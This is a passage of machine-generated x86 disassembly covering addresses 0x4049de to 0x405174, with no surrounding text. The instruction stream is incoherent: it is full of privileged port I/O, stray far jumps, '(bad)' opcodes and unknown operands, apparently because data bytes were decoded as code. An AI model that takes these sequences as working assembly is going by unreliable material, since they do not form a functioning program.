  4049de:	es std 
  4049e0:	call   0x6e17:0x8563bbf5
  4049e7:	xor    al,0x6f
  4049e9:	loop   0x4049b7
  4049eb:	dec    ebp
  4049ec:	mov    esi,0xafe268bf
  4049f1:	adc    esi,ecx
  4049f3:	mov    DWORD PTR [ebx+0x3a],esi
  4049f6:	in     eax,dx
  4049f7:	push   ss
  4049f8:	adc    eax,DWORD PTR [edi-0x556c8a63]
  4049fe:	push   edx
  4049ff:	out    0xe1,eax
  404a01:	scas   eax,DWORD PTR es:[edi]
  404a02:	lahf   
  404a03:	ins    BYTE PTR es:[edi],dx
  404a04:	std    
  404a05:	popf   
  404a06:	adc    BYTE PTR [edx+0x6f],bh
  404a09:	imul   edi,DWORD PTR [edi+0x33],0x7
  404a0d:	mov    cl,0x54
  404a0f:	push   ebp
  404a10:	xor    BYTE PTR [edi],bh
  404a12:	dec    edi
  404a13:	jmp    0x404a74
  404a15:	dec    ebx
  404a16:	shr    BYTE PTR [ebp+0xc3c2c65],1
  404a1c:	ret    0xb5c9
  404a1f:	mov    cl,ch
  404a21:	popa   
  404a22:	in     al,dx
  404a23:	ret    
  404a24:	shr    DWORD PTR [edx+0x7d],1
  404a27:	pop    ebx
  404a28:	cdq    
  404a29:	popf   
  404a2a:	inc    eax
  404a2b:	addr16 mov edx,0xece7d55
  404a31:	sbb    al,0xf
  404a33:	push   ds
  404a34:	adc    BYTE PTR ds:0x54d96f02,ah
  404a3a:	pop    ebx
  404a3b:	mov    bh,0xbb
  404a3d:	addr16 push ecx
  404a3f:	mov    ds:0xbee8fc3f,al
  404a44:	push   ss
  404a45:	add    al,0xc9
  404a47:	xchg   ecx,eax
  404a48:	push   es
  404a49:	imul   edx,DWORD PTR [esi],0xaa4d041f
  404a4f:	hlt    
  404a50:	jmp    0x105d63c1
  404a55:	and    dl,BYTE PTR [ecx]
  404a57:	push   ebx
  404a58:	sahf   
  404a59:	icebp  
  404a5a:	cli    
  404a5b:	jle    0x404a78
  404a5d:	push   esp
  404a5e:	and    bh,BYTE PTR [edi-0xda59463]
  404a64:	imul   eax,DWORD PTR [edx-0x6a],0x3d5e157d
  404a6b:	inc    ebp
  404a6c:	lods   al,BYTE PTR ds:[esi]
  404a6d:	sub    BYTE PTR [edi-0x5416b25f],cl
  404a73:	sub    eax,0xed9835ce
  404a78:	or     BYTE PTR [edx-0x1586e1ee],0x6c
  404a7f:	neg    DWORD PTR [eax-0x5f]
  404a82:	sub    edx,DWORD PTR [edx]
  404a84:	sub    al,0x80
  404a86:	dec    eax
  404a87:	jnp    0x404af4
  404a89:	mov    eax,ds:0x1924f071
  404a8e:	mov    bh,0xb3
  404a90:	adc    esi,0xed2bb55e
  404a96:	test   BYTE PTR [eax],dh
  404a98:	xchg   edx,eax
  404a99:	mov    bl,0x29
  404a9b:	push   esi
  404a9c:	push   cs
  404a9d:	loope  0x404a3d
  404a9f:	jmp    0x46a2ea1c
  404aa4:	cmp    eax,0x4eafdae2
  404aa9:	push   eax
  404aaa:	cmc    
  404aab:	mov    BYTE PTR [eax-0x108647cb],ch
  404ab1:	dec    ebp
  404ab2:	pop    ebp
  404ab3:	in     al,dx
  404ab4:	push   0xffffffc5
  404ab6:	pop    es
  404ab7:	sub    DWORD PTR [ebx+esi*1-0x5c70c329],edi
  404abe:	dec    esp
  404abf:	or     esp,DWORD PTR [edi-0x54]
  404ac2:	mov    WORD PTR [ebx+0x35],gs
  404ac5:	aam    0x71
  404ac7:	push   eax
  404ac8:	adc    ch,dl
  404aca:	adc    al,0x46
  404acc:	mov    BYTE PTR ds:0x2376f893,bh
  404ad2:	mov    DWORD PTR [ecx+0x766fb5ec],0xbadbcb1e
  404adc:	loope  0x404ae1
  404ade:	push   ebx
  404adf:	mov    edx,0x4f8f0115
  404ae4:	repnz out dx,eax
  404ae6:	scas   al,BYTE PTR es:[edi]
  404ae7:	fdiv   QWORD PTR [esp+edx*1-0x208e27ba]
  404aee:	sub    al,BYTE PTR [ebp+0x182c3a63]
  404af4:	add    DWORD PTR [eax],edx
  404af6:	xchg   ebp,eax
  404af7:	add    eax,0x64597fd9
  404afc:	gs fcmovne st,st(6)
  404aff:	fst    DWORD PTR [eax]
  404b01:	mov    ecx,0x924f67ef
  404b06:	pop    eax
  404b07:	push   ss
  404b08:	test   al,0x2d
  404b0a:	outs   dx,DWORD PTR ds:[esi]
  404b0b:	sub    dh,al
  404b0d:	jl     0x404b3f
  404b0f:	adc    BYTE PTR [ebp-0x72],al
  404b12:	out    dx,al
  404b13:	sub    ebx,DWORD PTR [esi+edi*2+0x5b6bf2a3]
  404b1a:	jecxz  0x404b61
  404b1c:	or     DWORD PTR [esi-0x79],esp
  404b1f:	mov    DWORD PTR [ebp+0x778c921e],ebp
  404b25:	mov    ?,eax
  404b27:	or     DWORD PTR [edx+0x58],ebx
  404b2a:	or     esi,DWORD PTR ds:[edi+0x1a]
  404b2e:	xchg   DWORD PTR [bx+di+0x554c],ecx
  404b33:	les    ebp,FWORD PTR [ebp-0x22dd899c]
  404b39:	adc    eax,0xac22dfc7
  404b3e:	popf   
  404b3f:	or     esi,ecx
  404b41:	jmp    0x1be21d1
  404b46:	xchg   ebp,eax
  404b47:	push   0x2bb65b9
  404b4c:	sahf   
  404b4d:	add    al,0x2d
  404b4f:	stc    
  404b50:	loope  0x404b19
  404b52:	xchg   ecx,eax
  404b53:	xor    bh,dh
  404b55:	outs   dx,DWORD PTR ds:[esi]
  404b56:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404b58:	rcr    DWORD PTR [eax-0x7f],1
  404b5b:	jecxz  0x404b20
  404b5d:	sub    ebp,DWORD PTR [edx-0x68091ed5]
  404b63:	pop    esp
  404b64:	pushf  
  404b65:	or     DWORD PTR [ebx+0x1a],eax
  404b68:	mov    ch,0xbb
  404b6a:	dec    eax
  404b6b:	xchg   ecx,eax
  404b6c:	arpl   WORD PTR [esi],bx
  404b6e:	jae    0x404ba5
  404b70:	mov    dl,0x51
  404b72:	inc    ecx
  404b73:	aam    0x31
  404b75:	dec    ebp
  404b76:	in     al,0xa
  404b78:	cmp    eax,0x450b40e4
  404b7d:	adc    esp,ebx
  404b7f:	push   cs
  404b80:	mov    dl,0xca
  404b82:	mov    BYTE PTR ds:0x4f742e78,bh
  404b88:	cld    
  404b89:	and    ebp,DWORD PTR [ebx+0x2a]
  404b8c:	aam    0x95
  404b8e:	clc    
  404b8f:	sbb    eax,0xbf1d3483
  404b94:	push   ebp
  404b95:	inc    BYTE PTR [ecx]
  404b97:	cmc    
  404b98:	pop    ss
  404b99:	xor    bl,0x31
  404b9c:	repnz add esp,DWORD PTR [edi+esi*1]
  404ba0:	cld    
  404ba1:	int3   
  404ba2:	mov    al,ds:0x4679a461
  404ba7:	sahf   
  404ba8:	bound  bx,DWORD PTR [esi]
  404bab:	and    DWORD PTR [esi],ecx
  404bad:	test   eax,0xdf73b0df
  404bb2:	ins    DWORD PTR es:[edi],dx
  404bb3:	xchg   ebp,eax
  404bb4:	loope  0x404bbc
  404bb6:	and    cl,BYTE PTR [ebx-0x3a]
  404bb9:	aam    0x9a
  404bbb:	sbb    BYTE PTR [edi+0x46799b5f],0x16
  404bc2:	in     al,0x84
  404bc4:	adc    DWORD PTR [eax],0x18c4903b
  404bca:	ret    
  404bcb:	popa   
  404bcc:	popa   
  404bcd:	aaa    
  404bce:	xchg   ebx,eax
  404bcf:	std    
  404bd0:	push   esp
  404bd1:	(bad)  
  404bd2:	push   edx
  404bd3:	pop    ss
  404bd4:	inc    ebx
  404bd5:	cmp    ebp,edi
  404bd7:	iret   
  404bd8:	scas   eax,DWORD PTR es:[edi]
  404bd9:	dec    edx
  404bda:	in     al,0xe5
  404bdc:	push   0x54
  404bde:	mov    bl,0x85
  404be0:	pop    edx
  404be1:	adc    DWORD PTR [esi+0x1a],ecx
  404be4:	push   ss
  404be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404be6:	jge    0x404bed
  404be8:	ja     0x404c4d
  404bea:	int3   
  404beb:	add    DWORD PTR [edi+0x65f6cfc6],0xffffffb6
  404bf2:	shl    DWORD PTR [ebp-0x11],cl
  404bf5:	pop    ecx
  404bf6:	push   eax
  404bf7:	jbe    0x404b94
  404bf9:	dec    ebx
  404bfa:	xchg   DWORD PTR [eax-0x3f],ebx
  404bfd:	call   FWORD PTR [edi*1-0x590c9d19]
  404c04:	mov    ds:0x69da02ec,eax
  404c09:	retf   
  404c0a:	dec    esi
  404c0b:	cmp    ch,bh
  404c0d:	in     al,dx
  404c0e:	shl    DWORD PTR [ebx-0x5aef108b],1
  404c14:	fwait
  404c15:	jnp    0x404c83
  404c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c18:	add    DWORD PTR [ecx+0x48],ebx
  404c1b:	and    ch,BYTE PTR [esi+esi*8]
  404c1e:	or     eax,0x1a1fd1da
  404c23:	cmp    DWORD PTR [esi+0x61b8cf9a],eax
  404c29:	push   0xa
  404c2b:	cmp    BYTE PTR [ebp+0x49],ah
  404c2e:	lods   eax,DWORD PTR ds:[esi]
  404c2f:	xor    ebx,DWORD PTR [edx+0x46]
  404c32:	loopne 0x404cb0
  404c34:	xor    edi,DWORD PTR [edx]
  404c36:	in     eax,dx
  404c37:	aam    0xbb
  404c39:	push   edi
  404c3a:	scas   al,BYTE PTR es:[edi]
  404c3b:	jns    0x404c79
  404c3d:	cld    
  404c3e:	cmc    
  404c3f:	mov    fs,esi
  404c41:	xchg   ebx,eax
  404c42:	adc    bl,BYTE PTR [edi-0x39]
  404c45:	(bad)  
  404c46:	cld    
  404c47:	or     eax,0x500278b6
  404c4c:	and    edx,ecx
  404c4e:	mov    bh,0x54
  404c50:	das    
  404c51:	sub    BYTE PTR [eax+0x4a],ah
  404c54:	adc    DWORD PTR [edi-0x2ec1ec5d],esp
  404c5a:	mov    WORD PTR [esi+0x23b950c2],fs
  404c60:	jo     0x404c1a
  404c62:	pop    ss
  404c63:	inc    ebx
  404c64:	les    ebx,FWORD PTR [eax-0x23]
  404c67:	or     al,0x29
  404c69:	ja     0x404c45
  404c6b:	popf   
  404c6c:	sub    esp,DWORD PTR [esi+0x5169bfdb]
  404c72:	ficom  DWORD PTR [edx-0x666d1432]
  404c78:	daa    
  404c79:	mov    ds:0x1f88a6a7,al
  404c7e:	inc    esp
  404c7f:	fwait
  404c80:	lea    esp,[ecx]
  404c82:	aaa    
  404c83:	adc    DWORD PTR [eax+eax*2-0x4],ecx
  404c87:	cmp    al,0x7e
  404c89:	add    ecx,esp
  404c8b:	in     al,0x2f
  404c8d:	cld    
  404c8e:	inc    esi
  404c8f:	mov    ebp,0x34e62a1f
  404c94:	mov    eax,esp
  404c96:	test   bl,al
  404c98:	adc    eax,0xf07584f5
  404c9d:	adc    ah,BYTE PTR [ecx]
  404c9f:	xchg   esi,eax
  404ca0:	iret   
  404ca1:	cwde   
  404ca2:	lods   eax,DWORD PTR ds:[esi]
  404ca3:	mov    edi,0x7b048e39
  404ca8:	out    dx,al
  404ca9:	jmp    0xf130:0xe99a10b0
  404cb0:	rol    BYTE PTR [edx],1
  404cb2:	(bad)  
  404cb3:	mov    ecx,0x45043c8b
  404cb8:	cmp    dh,bl
  404cba:	(bad)  
  404cbc:	out    0x28,eax
  404cbe:	jg     0x404c85
  404cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cc1:	pop    ecx
  404cc2:	jge    0x404c9b
  404cc4:	adc    BYTE PTR [edx+0x58],bh
  404cc7:	dec    ebx
  404cc8:	sub    cl,BYTE PTR [ebx-0xce11eb8]
  404cce:	adc    DWORD PTR ds:0xbbb3282b,0x27
  404cd5:	in     eax,dx
  404cd6:	dec    ebp
  404cd7:	xor    eax,0x8761f93a
  404cdc:	pop    ss
  404cdd:	mov    dh,0xff
  404cdf:	xor    al,0xb8
  404ce1:	jo     0x404cba
  404ce3:	xor    eax,0xab8dc269
  404ce8:	daa    
  404ce9:	sub    ah,BYTE PTR [ebx]
  404ceb:	ss loopne 0x404cc4
  404cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cef:	lahf   
  404cf0:	push   ebp
  404cf1:	in     eax,0x2f
  404cf3:	sub    al,0xb4
  404cf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cf6:	test   DWORD PTR [esi-0x70],eax
  404cf9:	mov    bh,0xee
  404cfb:	and    al,0x58
  404cfd:	in     al,0x9e
  404cff:	mov    al,ds:0x68e57ff3
  404d04:	pop    esp
  404d05:	adc    eax,0x8f306cf5
  404d0a:	mov    dh,ch
  404d0c:	push   esi
  404d0d:	(bad)  
  404d0e:	push   cs
  404d0f:	xchg   edi,eax
  404d10:	retf   
  404d11:	push   cs
  404d12:	gs add ecx,0x3783f504
  404d19:	aam    0x82
  404d1b:	jg     0x404d6f
  404d1d:	dec    esi
  404d1e:	cmp    al,0xbc
  404d20:	xchg   ebp,eax
  404d21:	jae    0x404d82
  404d23:	aam    0xd4
  404d25:	add    BYTE PTR [edi+0x5a],bh
  404d28:	or     cl,BYTE PTR [bx+0x27d5]
  404d2d:	push   ss
  404d2e:	nop
  404d2f:	xchg   BYTE PTR [edx+0x72210b11],bl
  404d35:	lods   eax,DWORD PTR ds:[esi]
  404d36:	cwde   
  404d37:	shl    esi,0xdc
  404d3a:	xchg   ebx,eax
  404d3b:	aam    0xbc
  404d3d:	(bad)  
  404d3e:	pop    ss
  404d3f:	inc    ecx
  404d40:	inc    esp
  404d41:	and    eax,0x61ba31df
  404d46:	and    eax,0xc6f71d77
  404d4b:	push   es
  404d4c:	jg     0x404d60
  404d4e:	or     al,bh
  404d50:	popf   
  404d51:	mov    bh,0xc9
  404d53:	add    BYTE PTR [edx+0x2261ceb2],bh
  404d59:	push   ss
  404d5a:	cmp    BYTE PTR [edx],ch
  404d5c:	add    DWORD PTR [ebp+0x4e1d524d],edi
  404d62:	jns    0x404d23
  404d64:	in     eax,0xfb
  404d66:	add    al,0x54
  404d68:	add    DWORD PTR [ebp+0x2b],edx
  404d6b:	mov    BYTE PTR [edi],al
  404d6d:	xor    al,0x7e
  404d6f:	jmp    0x8ccc:0xe3a14715
  404d76:	mov    esp,0xd73164
  404d7b:	push   ecx
  404d7c:	dec    esi
  404d7d:	add    DWORD PTR [ebx],edx
  404d7f:	in     eax,0x22
  404d81:	daa    
  404d82:	adc    esp,DWORD PTR [edx]
  404d84:	std    
  404d85:	ret    0xf573
  404d88:	daa    
  404d89:	push   ebp
  404d8a:	cwde   
  404d8b:	xchg   esp,eax
  404d8c:	js     0x404d7f
  404d8e:	mov    eax,0x109f8785
  404d93:	push   cs
  404d94:	dec    ebx
  404d95:	iret   
  404d96:	adc    ah,BYTE PTR [ebx]
  404d98:	lahf   
  404d99:	pop    ebx
  404d9a:	push   edi
  404d9b:	aad    0x33
  404d9d:	sub    BYTE PTR [edx-0x33],dl
  404da0:	sub    al,0x8c
  404da2:	jle    0x404e1f
  404da4:	cmp    BYTE PTR [esi+0x300bfa70],0xa3
  404dab:	adc    BYTE PTR [edi+edx*8-0x66],ch
  404daf:	dec    esp
  404db0:	rcr    edi,0x63
  404db3:	pop    es
  404db4:	pop    es
  404db5:	inc    DWORD PTR [edx+0x67e7671c]
  404dbb:	nop
  404dbc:	inc    eax
  404dbd:	aaa    
  404dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dbf:	push   ds
  404dc0:	mov    dh,0x4a
  404dc2:	adc    ebx,DWORD PTR [edi]
  404dc4:	out    dx,eax
  404dc5:	loopne 0x404e0b
  404dc7:	cmp    esp,esp
  404dc9:	rcl    DWORD PTR [esi],cl
  404dcb:	cmp    DWORD PTR [ecx+eiz*8-0x11],eax
  404dcf:	mov    bl,0xb2
  404dd1:	cmp    bl,BYTE PTR [eax]
  404dd3:	out    0x3f,al
  404dd5:	out    0x55,al
  404dd7:	mov    al,es:0xe8ecf87e
  404ddd:	sub    ebx,ecx
  404ddf:	aas    
  404de0:	mov    ds:0xdbf8e2da,eax
  404de5:	loope  0x404d7f
  404de7:	jl     0x404e60
  404de9:	push   ss
  404dea:	pushf  
  404deb:	jo     0x404e64
  404ded:	sub    al,0x41
  404def:	mov    esi,DWORD PTR [ebp+ebp*1+0x63e738d]
  404df6:	cmp    al,0xe0
  404df8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404dfa:	sub    BYTE PTR [ebx+0x74],0xa9
  404dfe:	mov    ds:0xa166d3d1,eax
  404e03:	shr    BYTE PTR [eax+0x49],1
  404e06:	mov    ?,WORD PTR [eax+0x45]
  404e09:	icebp  
  404e0a:	fild   WORD PTR [edi]
  404e0c:	in     eax,0xf8
  404e0e:	lds    esp,FWORD PTR [ecx+0x5a]
  404e11:	dec    edx
  404e12:	pop    esp
  404e13:	aaa    
  404e14:	loope  0x404e5d
  404e16:	dec    edx
  404e17:	pop    DWORD PTR [esi]
  404e19:	inc    ebx
  404e1a:	iret   
  404e1b:	xchg   ebx,eax
  404e1c:	loop   0x404dd9
  404e1e:	and    ch,BYTE PTR [eax]
  404e20:	call   0xaee664a1
  404e25:	xchg   edx,eax
  404e26:	loop   0x404e2b
  404e28:	outs   dx,BYTE PTR ds:[esi]
  404e29:	test   BYTE PTR [esi+0x4cd703e3],ah
  404e2f:	cmp    eax,DWORD PTR [edx]
  404e31:	sub    ah,BYTE PTR [esi+0x62]
  404e34:	xor    DWORD PTR [edx-0x46],ecx
  404e37:	xchg   ecx,eax
  404e38:	shr    DWORD PTR ds:0x90b8280b,0xdd
  404e3f:	dec    ebx
  404e40:	mul    BYTE PTR [esi+esi*4]
  404e43:	mov    bl,0xef
  404e45:	mov    dl,0x18
  404e47:	fidivr DWORD PTR [ebx-0x13]
  404e4a:	sub    BYTE PTR [edi],al
  404e4c:	sub    al,0x6d
  404e4e:	retf   
  404e4f:	sbb    al,BYTE PTR [edx+esi*8]
  404e52:	out    dx,eax
  404e53:	ins    BYTE PTR es:[edi],dx
  404e54:	adc    al,0xd7
  404e56:	pop    es
  404e57:	xchg   DWORD PTR [ebx],eax
  404e59:	jecxz  0x404eda
  404e5b:	outs   dx,DWORD PTR ds:[esi]
  404e5c:	stos   BYTE PTR es:[edi],al
  404e5d:	ins    DWORD PTR es:[edi],dx
  404e5e:	mov    ebx,0x8b0d9594
  404e63:	or     bl,BYTE PTR [esi]
  404e65:	jbe    0x404e73
  404e67:	cwde   
  404e68:	add    bh,bl
  404e6a:	sbb    ecx,DWORD PTR [esi-0x55]
  404e6d:	push   0x35
  404e6f:	pop    ebp
  404e70:	and    ax,0xf81e
  404e74:	retf   
  404e75:	mov    eax,0xe9cec250
  404e7a:	aam    0xc6
  404e7c:	xlat   BYTE PTR ds:[ebx]
  404e7d:	pop    edx
  404e7e:	nop
  404e7f:	and    eax,0x7e3cc7ec
  404e84:	or     ecx,eax
  404e86:	fnstenv [ebp+0xb]
  404e89:	pop    ecx
  404e8a:	retf   0xdeb0
  404e8d:	(bad)  
  404e8e:	ror    bl,1
  404e90:	xor    bh,dh
  404e92:	pop    eax
  404e93:	jb     0x404ed6
  404e95:	pop    edx
  404e96:	cdq    
  404e97:	add    al,0xc8
  404e99:	shr    ch,1
  404e9b:	xor    eax,0x12f186f3
  404ea0:	add    al,0x50
  404ea2:	adc    al,0xf4
  404ea4:	fidivr DWORD PTR [ecx-0x76]
  404ea7:	push   eax
  404ea8:	shl    DWORD PTR [ebx-0x79],0xeb
  404eac:	sub    BYTE PTR [edi-0x7],dl
  404eaf:	jmp    0x27da04bd
  404eb4:	loop   0x404f21
  404eb6:	push   ebx
  404eb7:	sbb    ecx,0x9614c054
  404ebd:	add    BYTE PTR ds:0xfafad8af,dl
  404ec3:	cmp    ah,bl
  404ec5:	stos   BYTE PTR es:[edi],al
  404ec6:	jle    0x404e9a
  404ec8:	mov    ds:0x2901b838,eax
  404ecd:	push   ebx
  404ece:	mov    esi,DWORD PTR [edi+eax*4-0x73]
  404ed2:	lods   al,BYTE PTR ds:[esi]
  404ed4:	xchg   edx,eax
  404ed5:	add    al,0x54
  404ed7:	pop    ecx
  404ed8:	pop    ecx
  404ed9:	mov    al,ds:0xdd34d8f6
  404ede:	fucomip st,st(0)
  404ee0:	cli    
  404ee1:	popa   
  404ee2:	mov    ch,0x52
  404ee4:	sub    dh,BYTE PTR [esi+0x893412b]
  404eea:	ret    
  404eeb:	jns    0x404ef5
  404eed:	paddq  mm1,QWORD PTR [edx+0x3800eb45]
  404ef4:	imul   eax,DWORD PTR [edi],0x1d64822f
  404efa:	add    BYTE PTR [edx+0xe831e7f],ah
  404f00:	jmp    0x4301:0x9d044958
  404f07:	xor    al,0x28
  404f09:	push   esi
  404f0a:	stos   DWORD PTR es:[edi],eax
  404f0b:	xor    ebp,esp
  404f0d:	ja     0x404ebd
  404f0f:	test   DWORD PTR [edi+eax*2+0x1ef7f5b4],edi
  404f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f17:	mov    esi,0xf254149d
  404f1c:	outs   dx,DWORD PTR ds:[esi]
  404f1d:	out    0x11,eax
  404f1f:	add    al,BYTE PTR [esp+eax*2]
  404f22:	mov    edi,0x908a37c4
  404f27:	and    BYTE PTR [esi],ah
  404f29:	cmp    DWORD PTR [edi-0x16b2b424],ebx
  404f2f:	fiadd  WORD PTR [edi]
  404f31:	fild   WORD PTR [ecx+0x11c68657]
  404f37:	add    ah,dl
  404f39:	inc    ebp
  404f3a:	xchg   ah,ch
  404f3c:	aad    0x8
  404f3e:	jg     0x404f8d
  404f40:	adc    cl,ch
  404f42:	int    0x21
  404f44:	test   al,0x4f
  404f46:	push   ecx
  404f47:	jg     0x404f2e
  404f49:	pop    edi
  404f4a:	shl    BYTE PTR [eax],cl
  404f4c:	adc    eax,0x2a2f0d6f
  404f51:	mov    al,0x86
  404f53:	out    0x3,eax
  404f55:	xchg   al,bh
  404f57:	adc    al,0xfc
  404f59:	sbb    eax,0x7db876c0
  404f5e:	sub    ah,BYTE PTR [ecx]
  404f60:	or     DWORD PTR [ecx-0x7a915573],esp
  404f66:	push   edi
  404f67:	sbb    BYTE PTR [edi-0x1fe6aae1],dh
  404f6d:	int3   
  404f6e:	jge    0x404f9d
  404f70:	mov    cl,0xf1
  404f72:	and    ebp,edi
  404f74:	ins    BYTE PTR es:[edi],dx
  404f75:	xor    al,0x44
  404f77:	icebp  
  404f78:	ss test al,0x10
  404f7b:	lods   al,BYTE PTR ds:[esi]
  404f7c:	dec    ebx
  404f7d:	lea    ebx,[ebx]
  404f7f:	fisubr WORD PTR [ecx+ecx*2-0x75]
  404f83:	inc    eax
  404f84:	pop    ecx
  404f85:	inc    esi
  404f86:	adc    al,0x69
  404f88:	adc    esp,DWORD PTR [eax+0x4]
  404f8b:	sar    BYTE PTR [edi+0x57bc990e],1
  404f91:	aas    
  404f92:	mov    edx,0xa6e66eb8
  404f97:	ret    
  404f98:	adc    DWORD PTR ds:0x75e91fd6,edx
  404f9e:	out    0x9e,eax
  404fa0:	fild   WORD PTR [ebx]
  404fa2:	xor    al,0x90
  404fa4:	cmp    eax,0x635c9307
  404fa9:	cmp    eax,0xc67ce9c8
  404fae:	pusha  
  404faf:	aaa    
  404fb0:	jno    0x404f83
  404fb2:	mov    eax,ds:0x7b72cf3d
  404fb7:	out    dx,eax
  404fb8:	mov    esp,0x38c2e430
  404fbd:	mov    eax,es
  404fbf:	enter  0x2e5f,0x71
  404fc3:	hlt    
  404fc4:	mov    edi,0xba62eee1
  404fc9:	pop    esp
  404fca:	mov    ds:0x48d89f33,eax
  404fcf:	xchg   esp,eax
  404fd0:	fadd   DWORD PTR [eax+0x77]
  404fd3:	and    al,0x6f
  404fd5:	dec    esi
  404fd6:	inc    ebx
  404fd7:	or     dh,dh
  404fd9:	test   BYTE PTR [edi-0x18873775],0xea
  404fe0:	xchg   edx,eax
  404fe1:	pop    eax
  404fe2:	test   eax,0xbedbdfeb
  404fe7:	push   cs
  404fe8:	xchg   edi,eax
  404fe9:	mov    ?,WORD PTR [edx+0x72b1bed9]
  404fef:	pop    es
  404ff0:	stos   BYTE PTR es:[edi],al
  404ff1:	dec    esp
  404ff2:	ficom  WORD PTR [ecx-0x58]
  404ff5:	pop    eax
  404ff6:	add    BYTE PTR [ebx-0x26],dl
  404ff9:	nop
  404ffa:	pusha  
  404ffb:	pop    ss
  404ffc:	scas   eax,DWORD PTR es:[edi]
  404ffd:	loopne 0x40503c
  404fff:	arpl   WORD PTR [ebp-0x4e773fb2],sp
  405005:	jbe    0x404fc8
  405007:	sub    bl,BYTE PTR [esi+0x14]
  40500a:	xchg   ebp,eax
  40500b:	inc    esi
  40500c:	pop    es
  40500d:	jle    0x405041
  40500f:	jb     0x404ffd
  405011:	inc    esp
  405012:	pushf  
  405013:	imul   ecx,esi,0xa8b4cd08
  405019:	adc    eax,0x13a10d42
  40501e:	loop   0x404fd0
  405020:	(bad)  
  405021:	gs add al,0x2d
  405024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405025:	jo     0x405077
  405027:	jnp    0x405051
  405029:	xor    dh,BYTE PTR [edx+0x72]
  40502c:	adc    al,0x81
  40502e:	aas    
  40502f:	ins    DWORD PTR es:[edi],dx
  405030:	cmp    al,0x8b
  405032:	(bad)  
  405033:	fst    QWORD PTR [esi+0x2a]
  405036:	or     BYTE PTR [edi-0x7b],ah
  405039:	neg    BYTE PTR ds:0xddac940b
  40503f:	sbb    DWORD PTR [ecx+ecx*4-0x59fde2bb],eax
  405046:	cs mov edx,0xdd24f889
  40504c:	jb     0x4050c9
  40504e:	push   ss
  40504f:	fisub  DWORD PTR [esi-0x47]
  405052:	mov    DWORD PTR [ebp-0x448ed4c4],ebp
  405058:	cdq    
  405059:	mov    edi,0x824a6c9
  40505e:	dec    esp
  40505f:	dec    ebx
  405060:	loop   0x40505f
  405062:	mov    cl,0xea
  405064:	xchg   edi,eax
  405065:	mov    edi,0x39b46bc2
  40506a:	adc    DWORD PTR ds:0xd5887744,esi
  405070:	(bad)  
  405071:	mov    eax,ds:0x8e3fb196
  405076:	and    cl,0x91
  405079:	jbe    0x40507b
  40507b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40507c:	mov    ch,0x40
  40507e:	jno    0x4050bf
  405080:	ja     0x40507a
  405082:	pop    ds
  405083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405084:	or     al,ch
  405086:	sub    al,0xde
  405088:	test   al,0x1d
  40508a:	jnp    0x405043
  40508c:	les    ebx,FWORD PTR [eax-0xb]
  40508f:	outs   dx,BYTE PTR ds:[esi]
  405090:	mov    dl,0x40
  405092:	cmp    al,al
  405094:	(bad)  
  405096:	cld    
  405097:	cwde   
  405098:	out    0xd5,eax
  40509a:	push   cs
  40509b:	jmp    0x405086
  40509d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40509e:	mov    bh,0x5d
  4050a0:	test   al,0xb0
  4050a2:	mov    al,0x41
  4050a4:	fbstp  TBYTE PTR [edi-0x462b0bbf]
  4050aa:	imul   ebp,DWORD PTR [edx],0x3f
  4050ad:	ss or  eax,0x4d1ff34a
  4050b3:	pusha  
  4050b4:	or     BYTE PTR [edi],bh
  4050b6:	and    al,0x9c
  4050b8:	dec    edx
  4050b9:	fld    DWORD PTR [ecx]
  4050bb:	fld    DWORD PTR [ebx+0x55f2ea9b]
  4050c1:	mov    edx,0x9353d1e7
  4050c6:	mov    eax,DWORD PTR [ecx+esi*2+0x6f]
  4050ca:	inc    dl
  4050cc:	fs cmc 
  4050ce:	fs mov ebx,0x8a7195f8
  4050d4:	sub    DWORD PTR [ecx+0x9],edi
  4050d7:	add    eax,0x856f82f2
  4050dc:	jmp    0xe96c:0xba08431c
  4050e3:	js     0x4050a4
  4050e5:	add    bl,BYTE PTR ds:0x5c947063
  4050eb:	cs aam 0xa4
  4050ee:	es mov esi,0x1d0fae5e
  4050f4:	jg     0x40513e
  4050f6:	or     eax,0xdf117805
  4050fb:	add    DWORD PTR [edi],edi
  4050fd:	dec    esi
  4050fe:	mov    eax,ds:0xf729408d
  405103:	inc    ebp
  405104:	dec    ebp
  405105:	pop    edx
  405106:	bound  ecx,QWORD PTR [esi+0x59]
  405109:	push   edx
  40510a:	push   esp
  40510b:	jl     0x4050eb
  40510d:	lock stos BYTE PTR es:[edi],al
  40510f:	aam    0x24
  405111:	adc    al,ch
  405113:	push   ebp
  405114:	int3   
  405115:	stos   BYTE PTR es:[edi],al
  405116:	iret   
  405117:	pop    ecx
  405118:	dec    edi
  405119:	popa   
  40511a:	adc    al,0xee
  40511d:	(bad)  
  40511e:	aam    0x61
  405120:	rcl    bh,0xb2
  405123:	jg     0x4050d1
  405125:	sub    ecx,DWORD PTR [ecx-0x59732731]
  40512b:	mov    eax,0xdd6c2312
  405130:	outs   dx,BYTE PTR ds:[esi]
  405131:	in     eax,0x69
  405133:	pop    ebp
  405134:	clc    
  405135:	pop    ebp
  405136:	ror    DWORD PTR [ecx],1
  405138:	rol    edx,0xe6
  40513b:	dec    ecx
  40513c:	cli    
  40513d:	call   0xa631d59a
  405142:	and    eax,0xa2321a46
  405147:	clc    
  405148:	je     0x4051af
  40514a:	sbb    eax,0xe635869a
  40514f:	mov    esi,0x65113770
  405154:	xchg   edi,eax
  405155:	jno    0x405150
  405157:	inc    esi
  405158:	inc    ebx
  405159:	test   DWORD PTR ds:0xd5e92879,esp
  40515f:	mov    esp,0x96c3b183
  405164:	pop    esi
  405165:	loopne 0x405188
  405167:	inc    ecx
  405168:	test   eax,0x3e4a3d6a
  40516d:	push   0x3c50cf1c
  405172:	aaa    
  405173:	xchg   ebx,eax
  405174:	fwait
